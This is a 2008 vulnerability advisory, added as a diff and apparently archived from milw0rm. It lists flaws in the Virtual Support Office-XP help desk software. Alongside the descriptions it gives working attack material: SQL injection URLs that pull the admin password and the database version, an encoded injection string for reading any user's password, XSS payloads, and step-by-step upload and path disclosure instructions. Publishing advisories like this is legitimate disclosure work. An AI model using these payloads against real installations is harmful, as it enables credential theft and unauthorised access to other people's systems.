@@ -1,0 +1,106 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: Virtual Support Office-XP Multiple Vulnerabilities.
+# Vendor: www.vso-xp.com
+# Vulnerable Version: 3.0.29, 3.0.27 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/47
+###################################################################################
+
+####################
+1. Description:
+####################
+
+    Virtual Support Office XP is Web Based Help Desk Software Solution which allows you to forge strong
+    relationships and increase customer satisfaction, while dramatically streamlining support operations.
+    With the VSO-XP application, customer service and support professionals have the tools they need to
+    surpass the most ambitious quality-of-service or productivity goals you establish.
+
+####################
+2. Vulnerabilities:
+####################
+
+    2.1. Broken Authentication and Session Management. An attacker can have access to classified information. And see some of admin pages. such as:
+"/admin/Companies.asp", "/admin/customfeild.asp" and "admin/EmailAccountsUpd.asp". The Last one is particularly important for she Change the Servers Name and Mail Box and Servers Port.
+
+    2.2. Broken Authentication.An attacker can register (sign up) users at "/signup.asp" without any kind of supervision or disclosureing any kind of information-even submitting a true email address is not necessary-she can obtain her password by injection-see.
+
+    2.3. Broken Authentication and Session Management. An attacker can make an admin user at "/admin/addressnew.asp".
+
+    2.4. Injection Flaws. SQL Injection in "/admin/CustomFields.asp" in "Group_ID" parameter. By using it an attacker can obtain the password of any user she wishes-including admin's. She can also get other information such as version of the database and...
+        2.4.1. Exploit:
+                        Check the exploit section.
+    2.5. Injection Flaws. SQL Injection in "/getpassword.asp" in"userID" parameter. By using it an attacker can obtain the password of any user she wishes.
+        2.5.1. Exploit:
+                        Check the exploit section.
+    2.6. Injection Flaws. SQL Injection in "/admin/accountupd.asp" in "keyid" parameter.Classified information can be obtained.
+        2.6.1. POC:
+                        https://url/admin/accountupd.asp?keyid=1%20having%201=1
+    2.7. Injection Flaws. SQL Injection in "/admin/clientupdreg.asp" in "Client_ID" parameter.
+        2.7.1. POC:
+                        https://url/admin/clientupdreg.asp?Client_ID=1%20having%201=1
+    2.8. Injection Flaws. SQL Injection in "/admin/EmailAccountsUpd_process.asp" in "KeyID" parameter.
+        2.8.1. POC:
+                        https://url/admin/EmailAccountsUpd_process.asp?KeyID=1 order by 2
+    2.9. Cross Site Scripting. There is a XSS in "/cases/case_search.asp" in search field.
+        2.9.1. POC:
+                        Insert  "><script>alert("mach BugReport.IR XSS");</script>
+    2.10. Cross Site Scripting. There is a XSS in "/url/kb/kb_home.asp" in Search Field.
+        2.10.1. POC:
+                        Insert  "><script>alert("mach BugReport.IR XSS");</script>
+    2.11 Cross Site Scripting. There is a XSS in "/downloads/search_folders.asp" in Search Fields.
+        2.11.1. POC:
+                        Insert  "><script>alert("mach BugReport.IR XSS");</script>
+    2.12. Cross Site Scripting. There is a XSS in "/reports/MyIssuesReport.asp?id=336" in Report Title and Subject fields.
+        2.12.1. POC:
+                        Insert  "><script>alert("mach BugReport.IR XSS");</script>
+    2.13. volunerable to file uploading and finding the phisical path to the file.
+        2.13.1. Exploit:
+                        Check the exploit section.
+    2.14. Path disclosure.
+        2.14.1 POC
+                        https://url/admin/accountnew2.asp
+####################
+3. Exploits:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/47/exploit
+    Note1: Use Internet Explorer (IE) for best result.
+    3.4.1 SQL Injection in "/admin/CustomFields.asp" in "Group_ID" parameter.
+            -------------
+            Obtain admin's password:
+                https://[URL]/admin/CustomFields.asp?Group_ID=1%20union%20select%20PASSWORD,1,1,1,1,1%20from%20users%20where%20USERID=%20'admin'--
+            -------------
+            Get other information such as version of the database and...:
+            https://[URL]/admin/CustomFields.asp?Group_ID=1union%20select%20@@version,1,1,1,1,1--
+            -------------
+    3.5.1 SQL Injection in "/admin/getpassword.asp" in "userID" parameter.
+            Insert the following Code in burpproxy, in userID field, change ANYUSERID to your choice of userID and get the password!
+            -------------
+            obtain the password of any user she wishes:
+            m%27%20or%201%20in%20%28select%20PASSWORD%20from%20users%20where%20USERID%3D%27ANYUSERID%27%29--
+            -------------
+    3.13.1 Scenario for file uploading and finding the physical path to the file.
+            -------------
+            Step1: Find the id of an existing folder easily at "/downloads/folders_root.asp?vsoxp_select=0"
+            Step2: Go to "/downloads/createfile.asp?id=VALIDFOLDERID" and upload your file.
+            Step3: Go back to step 1 and find your file?s ID.
+            Step4: Go to "/downloads/openlink.asp?id=YOURFILEID" and see the physical address of your file at server!
+            -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized for XSSes and Injections, and wait for vendor patch.
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Web security is our art.
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-20]
